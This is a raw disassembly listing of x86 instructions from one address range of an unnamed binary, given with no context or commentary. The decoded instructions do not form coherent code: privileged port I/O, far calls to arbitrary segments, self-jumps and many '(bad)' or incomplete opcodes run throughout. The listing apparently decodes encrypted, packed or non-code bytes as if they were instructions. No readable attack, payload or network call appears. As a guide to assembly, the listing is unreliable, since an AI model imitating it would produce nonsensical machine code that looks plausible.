  41db13:	mov    eax,0x519f98d8
  41db18:	arpl   si,si
  41db1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db1b:	retf   
  41db1c:	push   ebp
  41db1d:	jl     0x41db50
  41db1f:	sub    edi,DWORD PTR [ebx]
  41db21:	add    eax,DWORD PTR [edx-0x31f8f1c7]
  41db27:	shl    ebx,1
  41db29:	mov    BYTE PTR [eax-0xe867b72],dl
  41db2f:	test   DWORD PTR [ebp+0x20],eax
  41db32:	ins    BYTE PTR es:[edi],dx
  41db33:	das    
  41db34:	xchg   ebp,eax
  41db35:	data16 aas 
  41db37:	adc    edx,esp
  41db39:	lds    ebx,FWORD PTR [ebp+0x635dfb3f]
  41db3f:	(bad)  
  41db41:	sbb    al,0xce
  41db43:	imul   edx,DWORD PTR [ecx+0x140d4e37],0x15
  41db4a:	adc    eax,DWORD PTR ds:0xdd606c99
  41db50:	push   0xd5f231cb
  41db55:	mov    eax,ds:0x5c728c66
  41db5a:	daa    
  41db5b:	sahf   
  41db5c:	daa    
  41db5d:	rcl    ah,0x4c
  41db60:	call   0xff95:0xadf5bdd1
  41db67:	in     eax,dx
  41db68:	ins    DWORD PTR es:[edi],dx
  41db69:	sar    esp,1
  41db6b:	sahf   
  41db6c:	add    esi,DWORD PTR [esp+edi*1-0x6e]
  41db70:	cmp    cl,ch
  41db72:	fld    QWORD PTR [edi]
  41db74:	pop    esi
  41db75:	dec    edi
  41db76:	adc    al,0x5c
  41db78:	and    DWORD PTR [eax-0x3a4aead2],edi
  41db7e:	pop    esi
  41db7f:	cmp    BYTE PTR [esi],0xb9
  41db82:	outs   dx,BYTE PTR ds:[esi]
  41db83:	sahf   
  41db84:	cdq    
  41db85:	ds mov esp,0xe426f3db
  41db8b:	fsubr  QWORD PTR [edi+0x3e]
  41db8e:	inc    ebp
  41db8f:	mov    ah,0xc
  41db91:	ins    BYTE PTR es:[edi],dx
  41db92:	ret    0x25fc
  41db95:	inc    edx
  41db96:	mov    cl,0xaa
  41db98:	stos   BYTE PTR es:[edi],al
  41db99:	mov    ebx,0x1f9c33bc
  41db9e:	push   ds
  41db9f:	(bad)  
  41dba0:	outs   dx,BYTE PTR ds:[esi]
  41dba1:	rcr    DWORD PTR [ebx+0x45],cl
  41dba4:	leave  
  41dba5:	xchg   esi,eax
  41dba6:	lods   al,BYTE PTR ds:[esi]
  41dba7:	int3   
  41dba8:	pop    ebp
  41dba9:	in     eax,0xc9
  41dbab:	pop    ss
  41dbac:	and    eax,0xa4e92f96
  41dbb1:	int3   
  41dbb2:	pop    esp
  41dbb3:	iret   
  41dbb4:	in     al,dx
  41dbb5:	mov    bl,0x85
  41dbb7:	push   ecx
  41dbb8:	inc    ebp
  41dbb9:	and    BYTE PTR [ebx-0x68965df9],al
  41dbbf:	jecxz  0x41dc36
  41dbc1:	xchg   edi,eax
  41dbc2:	enter  0xdcbd,0xe2
  41dbc6:	or     esi,ebp
  41dbc8:	fild   QWORD PTR [ebx+0x143ec235]
  41dbce:	add    BYTE PTR [eax+ebp*4+0x8125183],ah
  41dbd5:	sub    al,0xec
  41dbd7:	pusha  
  41dbd8:	and    DWORD PTR [edi+eax*2+0x176ec75e],ebp
  41dbdf:	sbb    BYTE PTR [eax+0x1b],ch
  41dbe2:	mov    esp,0xcd7e080c
  41dbe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbe8:	xor    eax,0x7a09ab56
  41dbed:	adc    BYTE PTR [edx],cl
  41dbef:	push   ebx
  41dbf0:	test   eax,0x91616f67
  41dbf5:	aaa    
  41dbf6:	sbb    DWORD PTR [edi+edi*4],edi
  41dbf9:	cld    
  41dbfa:	ins    BYTE PTR es:[edi],dx
  41dbfb:	or     dh,BYTE PTR [esi]
  41dbfd:	sahf   
  41dbfe:	js     0x41dbc7
  41dc00:	das    
  41dc01:	dec    ebx
  41dc02:	ja     0x41dc73
  41dc04:	shl    BYTE PTR ds:0x7bf17c3d,1
  41dc0a:	cli    
  41dc0b:	dec    eax
  41dc0c:	repz test BYTE PTR [edx+eax*1],ch
  41dc10:	jb     0x41dc49
  41dc12:	out    dx,eax
  41dc13:	jp     0x41dbce
  41dc15:	push   0x950742a7
  41dc1a:	inc    ebx
  41dc1b:	dec    BYTE PTR [edi-0x10]
  41dc1e:	xor    DWORD PTR [edx*8-0x18357ae1],eax
  41dc25:	jl     0x41dbfd
  41dc27:	pop    ecx
  41dc28:	ds push es
  41dc2a:	fs test eax,0x94379178
  41dc30:	add    eax,0xd97c9e48
  41dc35:	aaa    
  41dc36:	inc    edi
  41dc37:	and    al,0xf1
  41dc39:	jle    0x41dc90
  41dc3b:	push   ecx
  41dc3c:	in     al,0xca
  41dc3e:	ins    DWORD PTR es:[edi],dx
  41dc3f:	scas   eax,DWORD PTR es:[edi]
  41dc40:	mov    bh,0x46
  41dc42:	push   es
  41dc43:	ret    
  41dc44:	push   ds
  41dc45:	or     DWORD PTR [esi+0x3e0bb187],0x29d4e9c0
  41dc4f:	data16 ja 0x41dbf4
  41dc52:	jle    0x41dc9c
  41dc54:	or     esp,DWORD PTR ds:0xc08c5565
  41dc5a:	in     eax,dx
  41dc5b:	shl    BYTE PTR [esp+edx*1+0x394ee2c],0xd1
  41dc63:	adc    DWORD PTR [ebx],ebp
  41dc65:	aam    0xb9
  41dc67:	les    ecx,FWORD PTR [ebx-0x53]
  41dc6a:	or     eax,0x52e6585e
  41dc6f:	mov    ch,0x81
  41dc71:	pop    esp
  41dc72:	iret   
  41dc73:	mov    edi,0xac8bb66
  41dc78:	lock pop ebp
  41dc7a:	jae    0x41dc55
  41dc7c:	mov    ds:0x1d453ba9,al
  41dc81:	jns    0x41dcc6
  41dc83:	ret    
  41dc84:	ja     0x41dc18
  41dc86:	(bad)  
  41dc87:	pop    ebx
  41dc88:	push   edx
  41dc89:	(bad)  
  41dc8a:	cs mov cl,0xc9
  41dc8d:	sti    
  41dc8e:	pop    esi
  41dc8f:	imul   esi,DWORD PTR [ebp-0x31],0xd0185301
  41dc96:	icebp  
  41dc97:	push   es
  41dc98:	sub    ch,BYTE PTR [ecx]
  41dc9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc9b:	cmp    BYTE PTR [edi],dl
  41dc9d:	dec    ebx
  41dc9e:	dec    eax
  41dc9f:	iret   
  41dca0:	cmc    
  41dca1:	iret   
  41dca2:	add    eax,0xd6a85ccf
  41dca7:	add    BYTE PTR [eax-0x2ba29b37],al
  41dcad:	pop    esp
  41dcae:	jecxz  0x41dcdb
  41dcb0:	sub    bh,0xe0
  41dcb3:	test   eax,0xcb84be2e
  41dcb8:	mov    cl,0x3
  41dcba:	or     al,0xc9
  41dcbc:	lods   al,BYTE PTR ds:[esi]
  41dcbd:	cmp    DWORD PTR [edi+0x7d],esi
  41dcc0:	add    bl,BYTE PTR [edx-0x41]
  41dcc3:	sub    eax,0xda9ba274
  41dcc8:	mov    al,ds:0x2200fa99
  41dccd:	xchg   esi,eax
  41dcce:	jmp    0x69e88c00
  41dcd3:	cdq    
  41dcd4:	fcom   QWORD PTR [ebp-0x4f4e4c5d]
  41dcda:	dec    edi
  41dcdb:	ds dec ebx
  41dcdd:	jae    0x41dca6
  41dcdf:	es push edi
  41dce1:	xchg   edx,eax
  41dce2:	arpl   WORD PTR [ebx+0x1a250e4d],cx
  41dce8:	stos   DWORD PTR es:[edi],eax
  41dce9:	rol    DWORD PTR [ecx-0x393d47dc],0x3f
  41dcf0:	leave  
  41dcf1:	retf   
  41dcf2:	pop    esp
  41dcf3:	mov    ah,0xd4
  41dcf5:	jmp    0x80c0:0x97c272f5
  41dcfc:	adc    al,0x32
  41dcfe:	rcr    DWORD PTR [edx-0x48],1
  41dd01:	or     al,0x50
  41dd03:	lods   al,BYTE PTR ds:[esi]
  41dd04:	xchg   esi,eax
  41dd05:	push   0xffffff9d
  41dd07:	xchg   BYTE PTR [eax-0x31],ah
  41dd0a:	dec    ebp
  41dd0b:	xor    DWORD PTR [ebp-0xb],ebx
  41dd0e:	mov    eax,ds:0x866827b4
  41dd13:	les    ebp,FWORD PTR [edi+ebp*1]
  41dd16:	add    eax,0x5e401440
  41dd1b:	adc    DWORD PTR [ecx-0x4f],edi
  41dd1e:	or     DWORD PTR [edi-0x5ea99ba6],ebp
  41dd24:	clc    
  41dd25:	sbb    al,0x5f
  41dd27:	mov    esp,0x1386781f
  41dd2c:	push   es
  41dd2d:	dec    edi
  41dd2e:	loop   0x41dd1c
  41dd30:	bound  esp,QWORD PTR ds:0xf930478d
  41dd36:	add    eax,0x906be7ad
  41dd3b:	mov    esi,0x46f8210e
  41dd40:	stos   DWORD PTR es:[edi],eax
  41dd41:	and    DWORD PTR [esi],esp
  41dd43:	icebp  
  41dd44:	xor    edi,ebp
  41dd46:	xor    al,BYTE PTR [edi]
  41dd48:	dec    ebp
  41dd49:	dec    edi
  41dd4a:	push   es
  41dd4b:	lods   eax,DWORD PTR ds:[esi]
  41dd4c:	mov    ecx,0x5d945dd
  41dd51:	in     eax,0xf1
  41dd53:	lock adc BYTE PTR [ebx-0x35],ch
  41dd57:	outs   dx,DWORD PTR ds:[esi]
  41dd58:	fiadd  DWORD PTR [edx-0x3eea0563]
  41dd5e:	sbb    dh,BYTE PTR [eax-0x2890110e]
  41dd64:	jns    0x41ddb4
  41dd66:	mov    ds:0x9b17777d,eax
  41dd6b:	call   FWORD PTR [edx-0x3b]
  41dd6e:	div    BYTE PTR [edx-0x14]
  41dd71:	push   es
  41dd72:	mov    ebx,0x6305fcd
  41dd77:	sbb    eax,0xa85da8c
  41dd7c:	popa   
  41dd7d:	es aas 
  41dd7f:	pop    eax
  41dd80:	sub    ch,BYTE PTR [eax-0x5a09d4a1]
  41dd86:	int    0x56
  41dd88:	aaa    
  41dd89:	into   
  41dd8a:	jmp    0x41dd89
  41dd8c:	xchg   BYTE PTR [edi+edi*4],dl
  41dd8f:	jno    0x41dd4c
  41dd91:	mov    ebx,0x13930ca6
  41dd96:	test   dh,cl
  41dd98:	stc    
  41dd99:	mov    ch,0x57
  41dd9b:	xor    cl,dl
  41dd9d:	jae    0x41dd40
  41dd9f:	push   ebx
  41dda0:	(bad)  
  41dda1:	mov    dl,0xc2
  41dda3:	lods   eax,DWORD PTR ds:[esi]
  41dda4:	aam    0xf7
  41dda6:	(bad)  
  41dda7:	jge    0x41ddf0
  41dda9:	mov    ch,ch
  41ddab:	aam    0xc4
  41ddad:	and    ch,ch
  41ddaf:	out    dx,eax
  41ddb0:	mov    ch,0xb7
  41ddb2:	rcr    ah,1
  41ddb4:	call   0x480d:0x3505bac3
  41ddbb:	imul   ebx,DWORD PTR [ebp-0x4e],0xffffffa7
  41ddbf:	sub    al,0x48
  41ddc1:	lods   al,BYTE PTR ds:[esi]
  41ddc2:	mov    ebx,?
  41ddc4:	mov    dl,0xc1
  41ddc6:	xchg   ebp,eax
  41ddc7:	ret    0xfa15
  41ddca:	jp     0x41dde5
  41ddcc:	jo     0x41dd6a
  41ddce:	out    dx,eax
  41ddcf:	scas   al,BYTE PTR es:[edi]
  41ddd0:	dec    ecx
  41ddd1:	cwde   
  41ddd2:	adc    eax,0x701de4cc
  41ddd7:	mov    ebx,0x9d82d33c
  41dddc:	jbe    0x41dd6a
  41ddde:	aad    0xc6
  41dde0:	loopne 0x41dde0
  41dde2:	ins    DWORD PTR es:[edi],dx
  41dde3:	lock rcl ah,1
  41dde6:	jb     0x41dd9d
  41dde8:	dec    esp
  41dde9:	repz mov cl,0x30
  41ddec:	sub    esi,ebx
  41ddee:	callw  0x9f55
  41ddf2:	lods   al,BYTE PTR ds:[esi]
  41ddf3:	add    al,0xba
  41ddf5:	pushf  
  41ddf6:	enter  0x712f,0xb
  41ddfa:	ins    BYTE PTR es:[edi],dx
  41ddfb:	push   cs
  41ddfc:	xchg   edi,eax
  41ddfd:	test   al,0xe5
  41ddff:	add    eax,0x179158e1
  41de04:	cmc    
  41de05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de06:	mov    cl,0x5
  41de08:	das    
  41de09:	mov    esi,DWORD PTR [edx+eiz*8+0x6b]
  41de0d:	push   ss
  41de0e:	jne    0x41ddaf
  41de10:	cmp    DWORD PTR [eax],0xffffffc7
  41de13:	inc    esp
  41de14:	dec    ebp
  41de15:	pop    ecx
  41de16:	jno    0x41de0a
  41de18:	add    ah,BYTE PTR [ebx]
  41de1a:	out    dx,eax
  41de1b:	jo     0x41ddc7
  41de1d:	std    
  41de1e:	mov    esp,0x6d4064b4
  41de23:	ficomp WORD PTR [eax+0x43763a7f]
  41de29:	mov    esp,0xeae5bf92
  41de2e:	ficom  DWORD PTR [ebp-0x1cf29e73]
  41de34:	sets   BYTE PTR [ecx+0x22406e1f]
  41de3b:	daa    
  41de3c:	xchg   ebx,eax
  41de3d:	mov    ebx,esp
  41de3f:	jmp    0x41de3c
  41de41:	sbb    ah,BYTE PTR [ebp-0x4fd5cc74]
  41de47:	imul   eax,DWORD PTR [edi+edi*8],0xffffffad
  41de4b:	adc    al,BYTE PTR [edx+0x16]
  41de4e:	cli    
  41de4f:	add    eax,0x1f28f759
  41de54:	stos   DWORD PTR es:[edi],eax
  41de55:	(bad)  
  41de56:	mov    BYTE PTR [edx],0x81
  41de59:	cmc    
  41de5a:	mov    bh,0xb0
  41de5c:	xchg   edx,eax
  41de5d:	jne    0x41de33
  41de5f:	test   al,ch
  41de61:	(bad)  [eax-0x32]
  41de64:	mov    al,BYTE PTR [ebx+0x695067f1]
  41de6a:	pop    edx
  41de6b:	cmp    ecx,edi
  41de6d:	std    
  41de6e:	mov    cl,0x29
  41de70:	xchg   dl,al
  41de72:	jmp    FWORD PTR [edi+0x6dc4a11e]
  41de78:	ret    
  41de79:	out    0xd1,al
  41de7b:	xor    al,0x8f
  41de7d:	push   eax
  41de7e:	call   0x65c9:0xd36b2b0b
  41de85:	enter  0xadbf,0x7b
  41de89:	mov    BYTE PTR [esi],cl
  41de8b:	jecxz  0x41de57
  41de8d:	adc    BYTE PTR [ebx-0x6c2cc39a],0xe3
  41de94:	mov    esi,cs
  41de96:	cmp    DWORD PTR [edi+0x199e0dba],edi
  41de9c:	shl    esi,cl
  41de9e:	dec    ecx
  41de9f:	adc    BYTE PTR [ebp+0x6c302c74],dh
  41dea5:	sbb    eax,DWORD PTR [edi+0x67ccc3f8]
  41deab:	push   ds
  41deac:	imul   edx,DWORD PTR [esi+ecx*2-0x32],0x2b
  41deb1:	push   esi
  41deb2:	mov    WORD PTR [ebp+0x53a7a18e],es
  41deb8:	jns    0x41de9f
  41deba:	test   al,bl
  41debc:	xor    eax,0x7bea5936
  41dec1:	inc    esp
  41dec2:	test   DWORD PTR [esi+ebx*8],edx
  41dec5:	xchg   BYTE PTR [eax],dl
  41dec7:	xchg   esp,eax
  41dec8:	repz (bad) 
  41deca:	repz jne 0x41df1a
  41decd:	shld   DWORD PTR [ebp-0x69],edi,cl
  41ded1:	mov    BYTE PTR [eax],ch
  41ded3:	mov    ebp,0x867bbf9a
  41ded8:	add    edi,ebx
  41deda:	aad    0xcd
  41dedc:	inc    ebx
  41dedd:	adc    BYTE PTR [ebx],bl
  41dedf:	xor    al,0xc9
  41dee1:	jle    0x41ded3
  41dee3:	fisttp DWORD PTR [edi]
  41dee5:	push   es
  41dee6:	(bad)
  41dee9:	scas   eax,DWORD PTR es:[edi]
  41deea:	(bad)  
  41deeb:	xchg   ebx,eax
  41deec:	dec    eax
  41deed:	cmc    
  41deee:	or     BYTE PTR [bx+si-0x1697],dh
  41def3:	xchg   esp,eax
  41def4:	jle    0x41df71
  41def6:	mov    DWORD PTR [esi],eax
  41def8:	mov    WORD PTR [edx],cs
  41defa:	pushf  
  41defb:	fisttp QWORD PTR [edx+ecx*1+0x378ba37b]
  41df02:	faddp  st(0),st
  41df04:	push   esi
  41df05:	jno    0x41df81
  41df07:	jge    0x41df12
  41df09:	ja     0x41decb
  41df0b:	mov    ebx,0x48df4590
  41df10:	jns    0x41df20
  41df12:	cmp    eax,0x34c515d9
  41df17:	cmp    al,0x16
  41df19:	(bad)  
  41df1a:	fmul   QWORD PTR [eax+0x49ce3b6d]
  41df20:	mov    DWORD PTR [edi-0x48ad76a8],edi
  41df26:	pop    edi
  41df27:	retf   0x306d
  41df2a:	inc    edi
  41df2b:	xor    DWORD PTR [esi],eax
  41df2d:	inc    edi
  41df2e:	adc    al,0xeb
  41df30:	mov    dl,0x6c
  41df32:	popa   
  41df33:	out    0xa9,al
  41df35:	xchg   DWORD PTR [eax],esi
  41df37:	mov    ecx,0x19214d5b
  41df3c:	push   esp
  41df3d:	push   ecx
  41df3e:	fs loope 0x41df02
  41df41:	pop    eax
  41df42:	out    0xfd,al
  41df44:	jl     0x41dfc4
  41df46:	ins    DWORD PTR es:[edi],dx
  41df47:	mov    esi,0x66e962bc
  41df4c:	and    ebp,DWORD PTR [ebx]
  41df4e:	push   cs
  41df4f:	aaa    
  41df50:	pop    edx
  41df51:	add    eax,0x4832478c
  41df56:	sbb    eax,0x1837d6c3
  41df5b:	sub    eax,0x116c8964
  41df60:	mov    ds:0xe1bc8bcb,al
  41df65:	call   0x1cb8:0x85d93827
  41df6c:	arpl   WORD PTR [edi+0x1fc74f1a],sp
  41df72:	popf   
  41df73:	je     0x41df5c
  41df75:	add    WORD PTR [esi+0x6f],0xffc3
  41df7a:	or     BYTE PTR [ebp-0x64],ah
  41df7d:	jne    0x41df52
  41df7f:	popa   
  41df80:	mov    ch,0x63
  41df82:	loope  0x41df70
  41df84:	clc    
  41df85:	inc    esp
  41df86:	pop    ebx
  41df87:	inc    edi
  41df88:	mov    DWORD PTR [ecx],esi
  41df8a:	pop    di
  41df8c:	(bad)  
  41df8d:	sti    
  41df8e:	sub    al,0x5e
  41df90:	add    ah,BYTE PTR [eax-0x6a]
  41df93:	add    eax,0x3b4c00b2
  41df98:	push   0x9a85a27b
  41df9d:	loope  0x41df29
  41df9f:	call   0x9e080ed
  41dfa4:	adc    DWORD PTR [esi+ebx*8+0x40f607d4],ebp
  41dfab:	mov    ah,0x7d
  41dfad:	add    al,0xd8
  41dfaf:	(bad)  
  41dfb0:	std    
  41dfb1:	ret    
  41dfb2:	jle    0x41df5e
  41dfb4:	inc    ecx
  41dfb5:	pop    ebx
  41dfb6:	lods   eax,DWORD PTR ds:[esi]
  41dfb7:	or     dl,BYTE PTR [ebp-0x6b]
  41dfba:	sbb    edx,0xe71e611e
  41dfc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfc1:	imul   esi,ebp,0x1
  41dfc4:	fwait
  41dfc5:	push   ecx
  41dfc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc7:	xchg   ecx,eax
  41dfc8:	push   es
  41dfc9:	sub    ebx,DWORD PTR [eax+eiz*8]
  41dfcc:	xor    eax,0x2bcec7c2
  41dfd1:	(bad)  
  41dfd2:	mul    eax
  41dfd4:	and    al,0x1e
  41dfd6:	mov    ebx,0x1e64379e
  41dfdb:	and    eax,0x89db3107
  41dfe0:	sub    al,0x52
  41dfe2:	adc    cl,BYTE PTR [edx]
  41dfe4:	hlt    
  41dfe5:	test   BYTE PTR [esi],dh
  41dfe7:	pushf  
  41dfe8:	fisub  WORD PTR [edx]
  41dfea:	mov    bh,0x6c
  41dfec:	mov    al,ds:0x57936b96
  41dff1:	loope  0x41dfb9
  41dff3:	je     0x41e048
  41dff5:	loopne 0x41dfbc
  41dff7:	pusha  
  41dff8:	int3   
  41dff9:	push   ecx
  41dffa:	fcomi  st,st(3)
  41dffc:	(bad)  
  41dffd:	mov    DWORD PTR [edx],eax
  41dfff:	push   cs
  41e000:	pop    edi
  41e001:	dec    esi
  41e002:	push   ebx
  41e003:	push   fs
  41e005:	push   ebx
  41e006:	shr    DWORD PTR [esi+ebp*1+0x7b1e9eef],0xe
  41e00e:	aaa    
  41e00f:	cmp    ch,BYTE PTR [eax]
  41e011:	sti    
  41e012:	stos   DWORD PTR es:[edi],eax
  41e013:	fcmovnbe st,st(5)
  41e015:	mov    ecx,0x44e84cac
  41e01a:	mov    WORD PTR [edx],?
  41e01c:	xchg   edx,eax
  41e01d:	ja     0x41dfdb
  41e01f:	test   esi,ebp
  41e021:	(bad)  
  41e022:	xor    DWORD PTR [eax-0x4420b873],esp
  41e028:	ret    0x5fc7
  41e02b:	clc    
  41e02c:	dec    ebp
  41e02d:	jb     0x41e04c
  41e02f:	or     dh,al
  41e031:	jno    0x41dfb3
  41e033:	jl     0x41dfea
  41e035:	push   eax
  41e036:	call   0xa7c:0x2781b5e7
  41e03d:	dec    esp
  41e03e:	push   0xffffffb5
  41e040:	not    DWORD PTR [ecx-0x10]
  41e043:	or     DWORD PTR [edi+0x28],0x21af5ecf
  41e04a:	scas   eax,DWORD PTR es:[edi]
  41e04b:	dec    ecx
  41e04c:	ins    DWORD PTR es:[edi],dx
  41e04d:	pop    eax
  41e04e:	adc    BYTE PTR [ebx+0x3cdba0f1],al
  41e054:	lods   al,BYTE PTR ds:[esi]
  41e055:	mov    esp,DWORD PTR [edi+0x73155800]
  41e05b:	dec    esp
  41e05c:	jle    0x41e04b
  41e05e:	and    ah,BYTE PTR [esi]
  41e060:	jge    0x41e0d3
  41e062:	inc    edi
  41e063:	pop    ss
  41e064:	(bad)  
  41e065:	sti    
  41e066:	xchg   BYTE PTR [ecx+ecx*2-0x7e],ch
  41e06a:	mov    edx,0xc2ccb4
  41e06f:	mov    ch,BYTE PTR [ecx-0x34]
  41e072:	add    cl,BYTE PTR [ebx+0x6a]
  41e075:	mov    WORD PTR [edi],cs
  41e077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e078:	sbb    ebp,DWORD PTR [ebp-0x39]
  41e07b:	out    dx,eax
  41e07c:	xor    ebp,eax
  41e07e:	inc    ebx
  41e07f:	push   edx
  41e080:	pop    ebx
  41e081:	sbb    DWORD PTR [edx+edi*8],ecx
  41e084:	adc    eax,0x51003814
  41e089:	jmp    0x41e05b
  41e08b:	aam    0x16
  41e08d:	fdivr  st,st(4)
  41e08f:	sbb    bl,ch
  41e091:	repz sbb dl,BYTE PTR [ecx]
  41e094:	jne    0x41e0a3
  41e096:	shl    ebp,1
  41e098:	fistp  WORD PTR [esi-0x71]
  41e09b:	push   0x42
  41e09d:	mov    al,ds:0x744c3b7c
  41e0a2:	or     eax,0x352912a1
  41e0a7:	mov    ebx,DWORD PTR [ebx+0xce40854]
  41e0ad:	repnz mov ah,0xc2
  41e0b0:	imul   edx,DWORD PTR [edx+0xcb28d62],0xffffffd0
  41e0b7:	cmc    
  41e0b8:	test   DWORD PTR [ecx+0x40],0x32dd2702
  41e0bf:	sbb    bh,bh
  41e0c1:	sub    al,0xb6
  41e0c3:	stos   DWORD PTR es:[edi],eax
  41e0c4:	pop    DWORD PTR [ecx]
  41e0c6:	mov    BYTE PTR fs:[eax+0x37],al
  41e0ca:	test   al,0x7
  41e0cc:	mov    BYTE PTR [ecx],al
  41e0ce:	retf   
  41e0cf:	jnp    0x41e136
  41e0d1:	in     eax,dx
  41e0d2:	and    al,0xb8
  41e0d4:	cmp    BYTE PTR [ebx-0x73],0xe1
  41e0d8:	push   0x3f22d5c9
  41e0dd:	nop
  41e0de:	int    0x13
  41e0e0:	pop    ebx
  41e0e1:	inc    esi
  41e0e2:	loop   0x41e07d
  41e0e4:	jmp    0x88560c49
  41e0e9:	jne    0x41e160
  41e0eb:	rcl    BYTE PTR [edx],0x30
  41e0ee:	xchg   dl,al
  41e0f0:	test   DWORD PTR [edi+edi*4+0x6b6cbaee],ebx
  41e0f7:	xchg   ebx,eax
  41e0f8:	pop    ecx
  41e0f9:	dec    ebp
  41e0fa:	jno    0x41e0fe
  41e0fc:	into   
  41e0fd:	mov    ?,WORD PTR [edi-0x1d]
  41e100:	repz mov ah,0xd
  41e103:	jns    0x41e164
  41e105:	xchg   esp,eax
  41e106:	pcmpeqd mm3,mm1
  41e109:	stc    
  41e10a:	loopne 0x41e0a3
  41e10c:	shr    BYTE PTR [eax+0x7b9a28bf],0xe7
  41e113:	push   esp
  41e114:	adc    ebx,DWORD PTR fs:[esp+ecx*1-0x48]
  41e119:	test   eax,0x947a49d6
  41e11e:	int    0x2f
  41e120:	faddp  st(7),st
  41e122:	mov    eax,0x6ab4b63b
  41e127:	lahf   
  41e128:	ds pop edx
  41e12a:	pop    edx
  41e12b:	xor    eax,0x71a0b04e
  41e130:	in     al,dx
  41e131:	inc    ebp
  41e132:	loop   0x41e136
  41e134:	mov    esp,es
  41e136:	idiv   DWORD PTR [edi+0x4144bc58]
  41e13c:	mov    DWORD PTR [edi+esi*4-0x75447ff],esi
  41e143:	mov    ebx,0xb6fab7d1
  41e148:	mov    ebx,0x6bea2630
  41e14d:	push   0xf0b02c3f
  41e152:	out    dx,eax
  41e153:	add    BYTE PTR [edx],dl
  41e155:	sbb    BYTE PTR [edx],dl
  41e157:	or     DWORD PTR [ebx],ebx
  41e159:	inc    ebx
  41e15a:	xchg   ebp,eax
  41e15b:	nop
  41e15c:	out    dx,al
  41e15d:	(bad)  
  41e15f:	jmp    0x7f22:0xdedb2c0
  41e166:	pop    eax
  41e167:	jp     0x41e1d2
  41e169:	(bad)  
  41e16a:	mov    dl,0xcb
  41e16c:	imul   edx,DWORD PTR [edx-0x2c],0x50
  41e170:	pop    ebp
  41e171:	into   
  41e172:	inc    edi
  41e173:	addr16 es mov cl,0x80
  41e177:	mov    dh,0x4e
  41e179:	rcl    DWORD PTR [ecx-0x20],1
  41e17c:	loopne 0x41e1a0
  41e17e:	test   eax,0x1d588557
  41e183:	imul   ebx,DWORD PTR [edi],0x2a9c3608
  41e189:	push   ecx
  41e18a:	bound  ecx,QWORD PTR [eax+edi*2+0x6e]
  41e18e:	jl     0x41e1c0
  41e190:	das    
  41e191:	lods   eax,DWORD PTR ds:[esi]
  41e192:	pop    edx
  41e193:	add    DWORD PTR [edx+0x29111fae],0x4c
  41e19a:	xchg   BYTE PTR [edi+ecx*8],bl
  41e19d:	or     eax,0xfc29ecdd
  41e1a2:	cmp    al,0xff
  41e1a4:	xchg   esi,eax
  41e1a5:	sbb    eax,0x5622c0ad
  41e1aa:	push   ebx
  41e1ab:	stos   DWORD PTR es:[edi],eax
  41e1ac:	pop    edx
  41e1ad:	add    al,0xa
  41e1af:	sbb    bh,BYTE PTR [ebx-0x2b057e4f]
  41e1b5:	adc    ebx,DWORD PTR [edi-0x80]
  41e1b8:	into   
  41e1b9:	jecxz  0x41e1b8
  41e1bb:	dec    ecx
  41e1bc:	cs jne 0x41e163
  41e1bf:	and    ah,bl
  41e1c1:	leave  
  41e1c2:	inc    ecx
  41e1c3:	jno    0x41e1ac
  41e1c5:	mul    BYTE PTR [edi+0x503ddc3]
  41e1cb:	pop    eax
  41e1cc:	or     DWORD PTR [ebx],edi
  41e1ce:	fidiv  DWORD PTR [ecx]
  41e1d0:	out    dx,al
  41e1d1:	call   0x523ac5e9
  41e1d6:	js     0x41e23d
  41e1d8:	jg     0x41e172
  41e1da:	jle    0x41e19a
  41e1dc:	loop   0x41e180
  41e1de:	dec    esp
  41e1df:	lock xor al,0xb8
  41e1e2:	jne    0x41e196
  41e1e4:	xchg   dx,ax
  41e1e6:	jno    0x41e25d
  41e1e8:	rcl    DWORD PTR [eax],1
  41e1ea:	add    esi,DWORD PTR [edi+eiz*8-0x26]
  41e1ee:	lea    edx,[eax+0xb]
  41e1f1:	ffree  st(7)
  41e1f3:	ss scas al,BYTE PTR es:[edi]
  41e1f5:	sbb    ebp,DWORD PTR [eax+0x1c]
  41e1f8:	cmp    esp,edi
  41e1fa:	jno    0x41e181
  41e1fc:	or     eax,0x7e41ffcd
  41e201:	xchg   edx,eax
  41e202:	sub    al,0x5a
  41e204:	lods   eax,DWORD PTR ds:[esi]
  41e205:	pop    edx
  41e206:	in     eax,0xf6
  41e208:	xchg   esi,eax
  41e209:	fisttp DWORD PTR [eax]
  41e20b:	and    DWORD PTR [edi+0x1853d2e9],edx
  41e211:	ins    BYTE PTR es:[edi],dx
  41e212:	daa    
  41e213:	xchg   BYTE PTR ds:0xab043721,dl
  41e219:	xchg   esi,eax
  41e21a:	or     eax,DWORD PTR [ecx]
  41e21c:	cdq    
  41e21d:	pop    ebx
  41e21e:	(bad)  
  41e21f:	jmp    FWORD PTR [ebx]
  41e221:	sbb    BYTE PTR [ebp-0xc973a78],al
  41e227:	in     al,dx
  41e228:	cli    
  41e229:	dec    eax
  41e22a:	jp     0x41e277
  41e22c:	in     eax,0xc4
  41e22e:	test   DWORD PTR [eax+eiz*2-0x8],ecx
  41e232:	push   eax
  41e233:	and    DWORD PTR [esi],edx
  41e235:	adc    eax,0xbff9c9d9
  41e23a:	or     eax,0x4ca55811
  41e23f:	inc    ecx
  41e240:	cmp    DWORD PTR [eax+0x85dfded],ecx
  41e246:	sub    ah,BYTE PTR [edi-0x3842e598]
  41e24c:	imul   DWORD PTR [edx]
  41e24e:	add    al,0x7f
  41e250:	or     eax,0xd229dbf
  41e255:	in     al,0x27
  41e257:	mov    ch,0x8f
  41e259:	adc    esi,DWORD PTR [eax-0x6bb44772]
  41e25f:	xchg   esp,eax
  41e260:	lea    ecx,[edx-0x27]
  41e263:	xor    DWORD PTR [eax],edx
  41e265:	push   es
  41e266:	adc    cl,bl
  41e268:	ins    DWORD PTR es:[edi],dx
  41e269:	jge    0x41e212
  41e26b:	sbb    eax,0x99ada4a8
  41e270:	les    ecx,FWORD PTR [ebx]
  41e272:	sbb    bh,BYTE PTR [ebp-0x3e9623df]
  41e278:	add    eax,0xf9a248d5
  41e27d:	lods   al,BYTE PTR ds:[esi]
  41e27e:	mov    cs,WORD PTR [esi-0x55b4045f]
